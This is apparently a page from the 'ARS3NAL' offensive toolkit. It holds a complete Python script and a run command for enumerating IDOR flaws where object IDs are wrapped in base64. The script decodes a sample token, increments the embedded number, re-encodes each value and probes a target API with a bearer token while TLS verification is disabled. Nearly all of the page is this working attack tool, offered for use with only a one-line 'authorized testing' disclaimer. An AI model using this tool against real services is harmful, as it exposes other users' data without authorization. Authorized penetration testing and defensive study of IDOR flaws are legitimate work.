The same IDOR enumeration, but for when the ID is not a bare number but **wrapped in base64** (a common way to disguise `id=42` as `NDI=` or `user:42` as `dXNlcjo0Mg==`). The script takes a sample token, decodes it, finds the numeric part, increments it across a range and re-encodes it as base64 - i.e. it enumerates neighboring objects without knowing the original scheme. Use it when you see a suspicious base64 string in a parameter instead of a clean number.

> The script auto-detects the prefix/suffix around the number (for example `user:` or `"id":`) and preserves it while enumerating. If the encoding is not base64 (but, say, base64url or hex) - adjust `decode`/`encode` to the format.

```python
#!/usr/bin/env python3
# idor_b64.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, base64, re, requests
requests.packages.urllib3.disable_warnings()

def decode(tok):
    pad = tok + "=" * (-len(tok) % 4)
    try:
        return base64.b64decode(pad).decode("utf-8", "replace")
    except Exception:
        return None

def encode(raw):
    return base64.b64encode(raw.encode()).decode().rstrip("=")

def split_number(raw):
    # find the last number in the decoded string: prefix + N + suffix
    m = re.search(r"^(.*?)(\d+)(\D*)$", raw, re.S)
    if not m:
        return None
    return m.group(1), int(m.group(2)), m.group(3)

def fetch(url_tpl, token_val, auth, where, base):
    h = {"User-Agent": "ARS3NAL-idor/1.0"}
    if auth:
        h["Authorization"] = auth if auth.lower().startswith("bearer") else f"Bearer {auth}"
    try:
        if where == "path":
            r = requests.get(url_tpl.replace("FUZZ", token_val), headers=h,
                             verify=False, timeout=15, allow_redirects=False)
        else:
            r = requests.get(base, headers=h, params={where: token_val},
                             verify=False, timeout=15, allow_redirects=False)
        return r.status_code, len(r.text), r.text[:120]
    except requests.RequestException:
        return -1, 0, ""

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL base64-wrapped IDOR enumerator")
    ap.add_argument("-u", "--url", required=True, help="URL with FUZZ where the b64 token goes")
    ap.add_argument("--sample", required=True, help="one valid b64 id token (e.g. NDI=)")
    ap.add_argument("--where", default="path", help="'path' or a query param name")
    ap.add_argument("--span", type=int, default=20, help="+/- range around the sample id")
    ap.add_argument("-t", "--token", default="", help="auth bearer token")
    a = ap.parse_args()
    raw = decode(a.sample)
    if raw is None:
        print("[!] sample does not decode as base64"); return
    parts = split_number(raw)
    if not parts:
        print(f"[!] no number to increment in decoded {raw!r}"); return
    pre, num, suf = parts
    print(f"[*] decoded {a.sample!r} -> {raw!r}  (prefix={pre!r} id={num} suffix={suf!r})\n")
    base = a.url.split("?")[0]
    print(f"{'id':>8} {'token':<24} {'code':>5} {'len':>7}  preview")
    for cand in range(max(0, num - a.span), num + a.span + 1):
        tok = encode(f"{pre}{cand}{suf}")
        code, ln, prev = fetch(a.url, tok, a.token, a.where, base)
        mark = " <<<" if code == 200 else ""
        print(f"{cand:>8} {tok:<24} {code:>5} {ln:>7}  {prev!r}{mark}")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 idor_b64.py -u "https://target/api/doc/FUZZ" --sample "dXNlcjo0Mg==" -t "eyJ..." --span 30
```
